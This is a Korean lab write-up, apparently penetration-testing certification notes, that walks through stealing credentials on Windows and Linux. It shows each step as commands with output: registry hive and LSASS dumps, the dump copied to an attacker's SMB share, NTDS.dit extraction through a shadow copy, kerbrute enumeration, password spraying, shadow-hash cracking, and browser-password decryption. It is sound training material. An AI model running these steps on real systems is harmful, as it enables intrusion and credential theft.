---
title: "Password Attacks - Extracting Passwords from Windows and Linux"
date: 2026-08-15
layout: single
excerpt: "Windows의 SAM, SYSTEM, SECURITY 하이브와 LSASS, NTDS.dit, Linux의 passwd, shadow 및 구성, 히스토리, 브라우저 파일을 분석하여 저장된 자격 증명을 추출하고 검증하는 흐름을 실습한다."
author_profile: true
toc: true
toc_label: "Password Attacks"
toc_icon: "book"
toc_sticky: true
categories: [cpts-infra]
tags: [windows, cpts, priv-esc, credential-theft, pillaging, lateral-movement, registry, browser-credentials, scheduled-tasks]
---

Windows의 SAM, SYSTEM, SECURITY 하이브와 LSASS, NTDS.dit, Linux의 passwd, shadow 및 구성, 히스토리, 브라우저 파일을 분석하여 저장된 자격 증명을 추출하고 검증하는 흐름을 실습한다.

# Window

## Windows Authentication Process

Windows에서는 사용자가 로그인할 때 여러 인증 구성 요소를 거치게 된다.

사용자가 로그인을 시도하면 Winlogon과 자격 증명 공급자(Credential Provider)를 통해 자격 증명이 수집되고, 이후 LSA와 LSASS가 인증 처리를 담당한다.

입력된 자격 증명이 올바르지 않으면 인증에 실패하며, 인증에 성공한 뒤에는 인증 방식과 세션 상태에 따라 해시, Kerberos 티켓 등 여러 인증 자료가 LSASS 메모리에 존재할 수 있다.

로컬 계정의 자격 증명 정보는 주로 SAM에 저장되며, Active Directory 도메인 계정 정보는 도메인 컨트롤러의 NTDS.dit에 저장된다. 

실제 인증 과정에서는 로컬 인증과 도메인 인증에 따라 관련 인증 패키지와 도메인 컨트롤러가 이러한 정보를 사용한다.

즉, LSASS는 Windows 인증의 핵심 프로세스이며, 로컬 계정과 도메인 계정은 각각 서로 다른 자격 증명 저장소와 인증 흐름을 사용한다고 이해하면 된다.

> 추가로 SECURITY 하이브가 존재한다. 이 하이브에는 LSA Secrets, Cached Domain Logon 관련 정보, 서비스 계정의 비밀 정보, DPAPI_SYSTEM과 같은 시스템 수준의 비밀 값이 저장될 수 있다. 따라서 SYSTEM 하이브와 함께 분석하면 이러한 값을 복호화하여 추출할 수 있다.

## Attacking SAM, SYSTEM, and SECURITY

### Saving and Extracting Registry Hives

우선 SAM, SYSTEM, SECURITY 레지스트리 하이브를 파일로 저장하였다:

```powershell
*Evil-WinRM* PS C:\Users\bob\Documents> reg.exe save hklm\sam C:\sam.save
The operation completed successfully.

*Evil-WinRM* PS C:\Users\bob\Documents> reg.exe save hklm\system C:\system.save
The operation completed successfully.

*Evil-WinRM* PS C:\Users\bob\Documents> reg.exe save hklm\security C:\security.save
The operation completed successfully.
```

현재 시스템에서 사용 중인 레지스트리 하이브이기 때문에 일반적인 `copy` 가 아니라 `reg save` 를 사용하여 별도의 파일로 저장한다.

이후 저장된 각 파일을 로컬로 다운로드하였다:

```powershell
*Evil-WinRM* PS C:\> download sam.save                                        
Info: Download successful!

*Evil-WinRM* PS C:\> download system.save                                  
Info: Download successful!

*Evil-WinRM* PS C:\> download security.save                                     
Info: Download successful!
```

이후 `impacket-secretsdump` 를 활용하여 자격 증명과 LSA Secrets를 추출할 수 있다:

```bash
$ impacket-secretsdump -sam sam.save -system system.save -security security.save local
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xd33955748b2d17d7b09c9cb2653dd0e8
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
bob:1001:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
jason:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
ITbackdoor:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
frontdesk:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
[*] NL$KM 
 0000   E4 FE 18 4B 25 46 81 18  BF 23 F5 A3 2A E8 36 97   ...K%F...#..*.6.
 0010   6B A4 92 B3 A4 32 DE B3  91 17 46 B8 EC 63 C4 51   k....2....F..c.Q
 0020   A7 0C 18 26 E9 14 5A A2  F3 42 1B 98 ED 0C BD 9A   ...&..Z..B......
 0030   0C 1A 1B EF AC B3 76 C5  90 FA 7B 56 CA 1B 48 8B   ......v...{V..H.
NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b
[*] _SC_gupdate 
(Unknown User):Password123
[*] Cleaning up... 
                  
```

이처럼 여러 로컬 사용자의 NTLM 해시와 DPAPI 관련 시스템 키를 확인할 수 있으며, `\_SC\_gupdate` 항목에서는 `gupdate` 서비스에 저장된 서비스 계정 암호가 평문으로 추출된 것을 확인할 수 있다.

이 값이 어떤 서비스 계정에 해당하는지는 레지스트리의 서비스 설정에서 `ObjectName` 값을 조회하여 확인할 수 있다:

```powershell
*Evil-WinRM* PS C:\> reg query HKLM\SYSTEM\CurrentControlSet\Services\gupdate /v ObjectName

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\gupdate
    ObjectName    REG_SZ    .\frontdesk
```

이처럼 현재 `gupdate` 서비스가 `.\frontdesk` 계정으로 실행되도록 설정되어 있으므로, 앞서 추출한 평문 암호와 조합하면 다음 자격 증명을 얻을 수 있다:

```text
frontdesk:Password123
```

## Attacking LSASS

### Creating an LSASS MiniDump

또 다른 방법으로 LSASS 프로세스의 메모리를 덤프하여 현재 로그인 세션에 남아 있는 인증 정보를 추출할 수 있다.

Windows의 `comsvcs.dll` 에 포함된 `MiniDump` 기능을 `rundll32` 로 호출하면 LSASS 프로세스의 메모리 덤프를 생성할 수 있다.

우선 시스템에서 `lsass.exe` 프로세스가 어떤 PID로 실행 중인지 확인하였다:

![Password Attacks](/assets/cpts-infra/password-attacks-extracting-passwords-from-windows-and-linux/pw-attack1.png)

이처럼 현재 LSASS가 PID 660으로 실행 중임을 확인하였다.

따라서 확인한 PID를 사용하여 `rundll32` 로 `comsvcs.dll` 의 `MiniDump` 기능을 호출하고 LSASS 메모리를 덤프할 수 있다.

다음과 같이 명령을 실행하였다:

```powershell
PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 660 C:\lsass.dmp full
```

덤프에 성공하면 `C:\lsass.dmp` 파일이 생성된다.

이 파일을 로컬로 가져오면 `pypykatz` 를 사용하여 오프라인에서 LSASS 덤프를 분석할 수 있다.

우선 로컬 Kali에서 SMB 서버를 실행하였다:

```bash
$ sudo impacket-smbserver share . -smb2support -username kali -password kali

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```

이후 Windows에서 `net use` 를 통해 SMB 서버에 인증하였다:

![Password Attacks](/assets/cpts-infra/password-attacks-extracting-passwords-from-windows-and-linux/pw-attack2.png)

그 다음 `copy` 명령으로 LSASS 덤프 파일을 SMB 공유로 전송하였다:

```powershell
PS C:\Windows\system32> copy C:\lsass.dmp \\10.10.15.31\share
```

### Offline Analysis with pypykatz

이후 `pypykatz` 를 사용하여 덤프 파일을 분석하였다:

```bash
$ pypykatz lsa minidump ./lsass.dmp 
INFO:pypykatz:Parsing file ./lsass.dmp
FILE: ======== ./lsass.dmp =======
== LogonSession ==
authentication_id 120980 (1d894)
session_id 0
username Vendor
domainname FS01
logon_server FS01
logon_time 2026-08-16T18:37:11.553911+00:00
sid S-1-5-21-2288469977-2371064354-2971934342-1003
luid 120980
        == MSV ==
                Username: Vendor
                Domain: FS01
                LM: NA
                NT: 31f87811133bc6aaa75a536e77f64314
                SHA1: 2b1c560c35923a8936263770a047764d0422caba
                DPAPI: 0000000000000000000000000000000000000000
        == WDIGEST [1d894]==
                username Vendor
                domainname FS01
                password None
                password (hex)
        == Kerberos ==
                Username: Vendor
                Domain: FS01
        == WDIGEST [1d894]==
                username Vendor
                domainname FS01
                password None
                password (hex)

# SKIP
```

이처럼 LSASS 덤프에서 로그인 세션과 NT 해시 등의 인증 정보를 확인할 수 있다.

## Attacking Active Directory and NTDS.dit

### Username Enumeration

Windows 로컬 계정의 자격 증명이 SAM에 저장되는 것과 달리, Active Directory 환경에서는 도메인 계정 정보가 도메인 컨트롤러의 `NTDS.dit` 데이터베이스에 저장된다.

우선 사용자 이름을 열거하기 전에 다음과 같은 실제 사용자 이름 정보를 확보하였다:

```text
John Marston
Carol Johnson
Jennifer Stapleton
```

이와 같은 실명 정보를 기반으로 가능한 사용자명 패턴을 생성해 주는 `username-anarchy` 도구를 사용할 수 있다.

따라서 이름들을 `names.txt` 에 저장한 뒤 `username-anarchy` 를 실행하여 여러 사용자명 후보를 생성하였다:

```bash
$ ./username-anarchy -i names.txt 

john
johnmarston
john.marston
johnmars
johnm
j.marston
jmarston
mjohn
m.john
marstonj
marston
marston.j
marston.john
jm
carol
```

먼저 도메인 이름을 확인하기 위해 NXC로 SMB 정보를 조회하였다:

```bash
$ nxc smb 10.129.129.64 -u '' -p ''

SMB         10.129.129.64   445    ILF-DC01         [*] Windows 10 / Server 2019 Build 17763 x64 (name:ILF-DC01) (domain:ILF.local) (signing:True) (SMBv1:False)
SMB         10.129.129.64   445    ILF-DC01         [+] ILF.local\: 
```

이처럼 대상 호스트의 이름은 `ILF-DC01`, 도메인은 `ILF.local` 임을 확인하였다.

생성한 사용자명 후보 목록을 기반으로 `kerbrute` 를 사용하여 실제로 존재하는 도메인 사용자를 열거할 수 있다:

```bash
$ kerbrute userenum --dc 10.129.129.64 --domain ILF.local userenum.txt

2026/08/16 20:10:04 >  Using KDC(s):
2026/08/16 20:10:04 >   10.129.129.64:88

2026/08/16 20:10:05 >  [+] VALID USERNAME:       jmarston@ILF.local
2026/08/16 20:10:05 >  [+] VALID USERNAME:       cjohnson@ILF.local
2026/08/16 20:10:05 >  [+] VALID USERNAME:       jstapleton@ILF.local
2026/08/16 20:10:05 >  Done! Tested 43 usernames (3 valid) in 1.052 seconds
```

그 결과 `jmarston`, `cjohnson`, `jstapleton` 세 사용자가 유효한 계정으로 확인되었다.

이후 각 사용자에 대해 지정된 워드리스트를 사용하여 암호 인증을 시도했고, 다음과 같이 유효한 자격 증명을 확인하였다:

```bash
$ nxc smb 10.129.129.64 -u jmarston -p /usr/share/set/src/fasttrack/wordlist.txt

SMB         10.129.129.64   445    ILF-DC01         [*] Windows 10 / Server 2019 Build 17763 x64 (name:ILF-DC01) (domain:ILF.local) (signing:True) (SMBv1:False)
# SKIP
SMB         10.129.129.64   445    ILF-DC01         [+] ILF.local\jmarston:P@ssword! (Pwn3d!)
```

그 결과 `jmarston` 사용자의 암호까지 확보하였다.

NXC 출력의 `Pwn3d!` 표시는 해당 자격 증명으로 대상 호스트에서 관리자 수준의 원격 작업이 가능하다고 판단되었음을 의미한다.

### Extracting NTDS.dit

이후 WinRM으로 접속한 뒤 현재 계정의 권한을 확인하였다:

```powershell
*Evil-WinRM* PS C:\Users\jmarston\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled

# SKIP
```

관리자 권한을 확보한 상태에서는 도메인 컨트롤러의 `NTDS.dit` 과 이를 복호화하는 데 필요한 SYSTEM 하이브를 추출할 수 있다.

우선 `NTDS.dit` 내부의 암호화된 자격 증명을 해석하는 데 필요한 BootKey를 얻기 위해 SYSTEM 하이브를 저장하였다:

```powershell
*Evil-WinRM* PS C:\Users\jmarston\Documents> reg.exe save hklm\system C:\Users\jmarston\system

The operation completed successfully.
```

`NTDS.dit` 은 실행 중인 도메인 컨트롤러에서 사용 중인 파일이므로 일반적인 방식으로 직접 복사하기 어렵다. 

따라서 Volume Shadow Copy를 생성한 뒤 해당 스냅샷에서 파일을 복사할 수 있다.

먼저 다음과 같이 `C:` 드라이브의 Shadow Copy를 생성하였다:

```powershell
*Evil-WinRM* PS C:\Users\jmarston> vssadmin CREATE SHADOW /For=C:

vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Successfully created shadow copy for 'C:\'
    Shadow Copy ID: {d6168e2d-bbb1-46a8-abf6-39af3d3f50f8}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
```

이처럼 `C:` 볼륨의 Shadow Copy가 생성되었으며, 출력된 Shadow Copy Volume Name 경로를 사용할 수 있다.

해당 Shadow Copy 경로에서 `NTDS.dit` 을 현재 작업 디렉터리로 복사하였다:

```powershell
*Evil-WinRM* PS C:\Users\jmarston> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit ./NTDS.dit

        1 file(s) copied.
```

이후 `NTDS.dit` 과 SYSTEM 하이브를 로컬로 다운로드한 뒤 `impacket-secretsdump` 를 사용하면 도메인 계정의 해시를 추출할 수 있다:

```bash
$ impacket-secretsdump -ntds ntds.dit -system system LOCAL

[*] Target system bootKey: 0x62649a98dea282e3c3df04cc5fe4c130
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 086ab260718494c3a503c47d430a92a4
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
ILF-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:faf26e8da1eead79a4538c5317233454:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cfa046b90861561034285ea9c3b4af2f:::
ILF.local\jmarston:1103:aad3b435b51404eeaad3b435b51404ee:2b391dfc6690cc38547d74b8bd8a5b49:::
ILF.local\cjohnson:1104:aad3b435b51404eeaad3b435b51404ee:5fd4475a10d66f33b05e7c2f72712f93:::
ILF.local\jstapleton:1108:aad3b435b51404eeaad3b435b51404ee:92fd67fd2f49d0e83744aa82363f021b:::
ILF.local\gwaffle:1109:aad3b435b51404eeaad3b435b51404ee:07a0bf5de73a24cb8ca079c1dcd24c13:::
LAPTOP01$:1111:aad3b435b51404eeaad3b435b51404ee:be2abbcd5d72030f26740fb531f1d7c4:::

# SKIP
```

### NetExec ntdsutil Module

또한 충분한 권한이 있다면 NXC의 `-M ntdsutil` 모듈을 사용하여 이 과정을 자동화하고 도메인 자격 증명 해시를 추출할 수도 있다:

```bash
$ nxc smb 10.129.129.64 -u jmarston -p P@ssword! -M ntdsutil
SMB         10.129.129.64   445    ILF-DC01         [*] Windows 10 / Server 2019 Build 17763 x64 (name:ILF-DC01) (domain:ILF.local) (signing:True) (SMBv1:False)
SMB         10.129.129.64   445    ILF-DC01         [+] ILF.local\jmarston:P@ssword! (Pwn3d!)

# SKIP

NTDSUTIL    10.129.129.64   445    ILF-DC01         Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::                                                                                            
NTDSUTIL    10.129.129.64   445    ILF-DC01         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                    
NTDSUTIL    10.129.129.64   445    ILF-DC01         ILF-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:faf26e8da1eead79a4538c5317233454:::                                                                                               
NTDSUTIL    10.129.129.64   445    ILF-DC01         krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cfa046b90861561034285ea9c3b4af2f:::                                                                                                   
NTDSUTIL    10.129.129.64   445    ILF-DC01         ILF.local\jmarston:1103:aad3b435b51404eeaad3b435b51404ee:2b391dfc6690cc38547d74b8bd8a5b49:::                                                                                      
NTDSUTIL    10.129.129.64   445    ILF-DC01         ILF.local\cjohnson:1104:aad3b435b51404eeaad3b435b51404ee:5fd4475a10d66f33b05e7c2f72712f93:::                                                                                      
NTDSUTIL    10.129.129.64   445    ILF-DC01         ILF.local\jstapleton:1108:aad3b435b51404eeaad3b435b51404ee:92fd67fd2f49d0e83744aa82363f021b:::                                                                                    
NTDSUTIL    10.129.129.64   445    ILF-DC01         ILF.local\gwaffle:1109:aad3b435b51404eeaad3b435b51404ee:07a0bf5de73a24cb8ca079c1dcd24c13:::                                                                                       
NTDSUTIL    10.129.129.64   445    ILF-DC01         LAPTOP01$:1111:aad3b435b51404eeaad3b435b51404ee:be2abbcd5d72030f26740fb531f1d7c4:::
```

# Linux 

## Linux Authentication Process

Linux에서는 `/etc/passwd` 에 사용자 계정 정보가 저장되고, 실제 비밀번호 해시는 일반적으로 권한이 제한된 `/etc/shadow` 에 저장된다.

root 권한을 확보한 뒤 추가 자격 증명을 확인하려는 경우, `passwd` 와 `shadow` 의 정보를 `unshadow` 로 결합하여 크랙 도구에서 사용할 입력 파일을 만들 수 있다:

```bash
$ unshadow passwd shadow > unshadowed.hashes
```

이후 Hashcat을 사용하여 해당 해시에 대해 사전 기반 크랙을 시도할 수 있다:

```bash
$ hashcat -m 1800 unshadowed.hashes /usr/share/wordlists/rockyou.txt --show --username

sarah:$6$EBOM5vJAV1TPvrdP$LqsLyYkoGzAGt4ihyvfhvBrrGpVjV976B3dEubi9i95P5cDx1U6BrE9G020PWuaeI6JSNaIDIbn43uskRDG0U/:mariposa
```

이처럼 `sarah` 계정의 비밀번호가 `mariposa` 임을 확인하였다.

또한 John the Ripper의 `--single` 모드를 사용하면 사용자명과 계정 정보를 기반으로 생성한 후보를 이용해 맞춤형 크랙을 시도할 수 있다:

```bash
$ john  --single unshadowed.hashes

Martin1          (martin)
```

별개로 일부 Linux 환경에서는 `/etc/security/opasswd` 파일이 존재할 수 있다.

이 파일은 PAM의 비밀번호 히스토리 기능에서 이전 비밀번호의 해시를 저장하여 비밀번호 재사용을 방지하는 데 사용될 수 있다.

따라서 접근 권한이 있는 경우 오래된 해시를 통해 과거 비밀번호 패턴에 대한 단서를 얻을 수도 있다.

## Credential Hunting in Linux

### Searching Files for Stored Credentials

Linux 환경에서는 애플리케이션 설정, 쉘 히스토리, 스크립트 등 다양한 파일에 자격 증명이 평문 또는 설정 값 형태로 남아 있을 수 있으므로 파일 기반으로 Credential Hunting을 수행하는 경우가 많다.

대표적으로 다음과 같은 위치를 확인할 수 있다:

```text
config + history + scripts + cron + SSH key + browser/keyring
```

웹 애플리케이션이나 서비스에서 사용하는 `.conf`, `.config`, `.cnf` 같은 설정 파일에 자격 증명이 포함될 수 있고, `.bash_history` 에도 사용자가 명령줄에 직접 입력한 계정 정보나 암호가 남아 있을 수 있다.

먼저 설정 파일을 찾기 위해 다음과 같이 확장자를 기준으로 검색할 수 있다:

```bash
kira@nix01:~$ for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

File extension:  .conf
/var/log/installer/subiquity-curtin-install.conf
/run/tmpfiles.d/static-nodes.conf
/run/systemd/resolved.conf.d/isc-dhcp-v4-ens192.conf
/run/systemd/resolve/resolv.conf
/run/systemd/resolve/stub-resolv.conf
/etc/snmp/snmp.conf
/etc/ltrace.conf
/etc/apparmor/parser.conf
/etc/sysctl.conf
/etc/overlayroot.conf
/etc/security/limits.conf
/etc/security/pam_env.conf
/etc/security/access.conf
# SKIP
```

찾아낸 설정 파일 내부에서 `user`, `password`, `pass` 와 같은 키워드를 `grep` 으로 검색하는 방법도 있다:

```bash
kira@nix01:~$ for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done

File:  /etc/alternatives/my.cnf
File:  /etc/mysql/debian.cnf
File:  /etc/mysql/mysql.conf.d/mysqld.cnf
user            = mysql
File:  /etc/mysql/mysql.conf.d/mysql.cnf
File:  /etc/mysql/conf.d/mysqldump.cnf
File:  /etc/mysql/conf.d/mysql.cnf
File:  /etc/mysql/my.cnf
File:  /etc/mysql/mysql.cnf
File:  /etc/ssl/openssl.cnf
challengePassword               = A challenge password
```

### Searching Text and Script Files

텍스트 파일이나 확장자가 없는 파일을 찾기 위해 다음과 같이 검색할 수도 있다:

```bash
kira@nix01:~$ find /home/* -type f -name "*.txt" -o ! -name "*.*"
/home/kira
/home/kira/.cache/fontconfig
/home/kira/.cache/libgweather
/home/kira/.cache/evolution
/home/kira/.cache/evolution/addressbook
/home/kira/.cache/evolution/addressbook/trash
/home/kira/.cache/evolution/sources
/home/kira/.cache/evolution/sources/trash
/home/kira/.cache/evolution/memos
/home/kira/.cache/evolution/memos/trash
# SKIP
```

스크립트 내부에 하드코딩된 자격 증명이 존재할 수도 있으므로 여러 스크립트 확장자를 함께 검색할 수 있다:

```bash
kira@nix01:~$ for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done

File extension:  .py
/etc/python3.8/sitecustomize.py
/etc/python3.9/sitecustomize.py
/usr/bin/mesa-overlay-control.py

File extension:  .pyc

File extension:  .pl

File extension:  .go

File extension:  .jar

File extension:  .c

File extension:  .sh
/boot/grub/i386-pc/modinfo.sh
/etc/init.d/hwclock.sh
/etc/init.d/keyboard-setup.sh
/etc/init.d/console-setup.sh
/etc/console-setup/cached_setup_keyboard.sh
/etc/console-setup/cached_setup_terminal.sh
/etc/console-setup/cached_setup_font.sh
# SKIP
```

### Checking Database Files and Shell History

데이터베이스 파일에도 계정 정보나 애플리케이션 데이터가 저장될 수 있으므로 관련 확장자를 검색할 수 있다:

```bash
kira@nix01:~$ for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done

DB File extension:  .sql

DB File extension:  .db
/var/cache/dictionaries-common/hunspell.db
/var/cache/dictionaries-common/wordlist.db
/var/cache/dictionaries-common/aspell.db
/var/cache/dictionaries-common/ispell.db
/home/kira/.mozilla/firefox/ytb95ytb.default-release/cert9.db
/home/kira/.mozilla/firefox/ytb95ytb.default-release/key4.db
# SKIP
```

또한 `.bash_history` 를 확인하면 사용자가 과거에 입력한 명령에서 자격 증명이나 접근 경로에 대한 단서를 찾을 수도 있다:

```bash
kira@nix01:~$ tail -n5 /home/*/.bash*
==> /home/kira/.bash_history <==
rm *
ssh-keygen -t rsa -m PEM
cat id_rsa.pub > authorized_keys
vim authorized_keys 
su
# SKIP
```

### Automated Credential Hunting with LaZagne

Linux에서도 LaZagne와 같은 자동화 도구를 사용하여 브라우저, 애플리케이션 설정 등 여러 위치에 저장된 자격 증명을 탐색할 수 있다:

```bash
kira@nix01:~/Linux$ python3 laZagne.py all

# SKIP

------------------- Firefox passwords -----------------
                                                        
[+] Password found !!!                                                                                             
URL: https://dev.inlanefreight.com                                                                                 
Login: will@inlanefreight.htb
Password: TUqr7QfLTLhruhVbCP
```

### Firefox Stored Credentials

Firefox에서 웹 페이지 로그인 정보를 저장하면 로그인 항목은 프로필의 `logins.json` 에 암호화된 형태로 기록되며, 복호화에 필요한 키 정보는 같은 프로필의 `key4.db` 등에 저장된다.

우선 Firefox 프로필 디렉터리가 다음과 같이 존재하는 것을 확인할 수 있다:

```bash
kira@nix01:~$ ls -l .mozilla/firefox/ | grep default

drwx------  2 kira kira 4096 Aug 17 04:29 lktd9y8y.default
drwx------ 10 kira kira 4096 Aug 17 04:29 ytb95ytb.default-release
```

이 중 사용 중인 프로필의 `logins.json` 을 확인하면 사용자 이름과 비밀번호가 암호화된 값으로 저장되어 있는 것을 볼 수 있다:

```bash
kira@nix01:~/.mozilla/firefox/ytb95ytb.default-release$ cat logins.json | jq .

{
  "nextId": 2,
  "logins": [
    {
      "id": 1,
      "hostname": "https://dev.inlanefreight.com",
      "httpRealm": null,
      "formSubmitURL": "https://dev.inlanefreight.com",
      "usernameField": "email",
      "passwordField": "password",
      "encryptedUsername": "MEIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECEuPp+tkcSROBBikTaPORjVYFBK/x6zuYjnhWGHhp6xu2ok=",                                                                                                            
      "encryptedPassword": "MEIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECFinWQ8t9QusBBg6tPWTkhxcMRHwvfUZBs9zUh8mQ6MgpYI=",                                                                                                            
      "guid": "{317acef6-be5a-4df2-abfc-ce0566b6e975}",
      "encType": 1,
      "timeCreated": 1644420310215,
      "timeLastUsed": 1644420310215,
      "timePasswordChanged": 1644420310215,
      "timesUsed": 1
    }
  ],
  "potentiallyVulnerablePasswords": [],
  "dismissedBreachAlertsByLoginGUID": {},
  "version": 3
}
```

이 저장 정보를 복호화하기 위해 `firefox_decrypt` 도구를 사용할 수 있다:

```bash
kira@nix01:~$ python3.9 firefox_decrypt.py

Select the Mozilla profile you wish to decrypt
1 -> lktd9y8y.default
2 -> ytb95ytb.default-release

2

Website:   https://dev.inlanefreight.com
Username: 'will@inlanefreight.htb'
Password: 'TUqr7QfLTLhruhVbCP'
```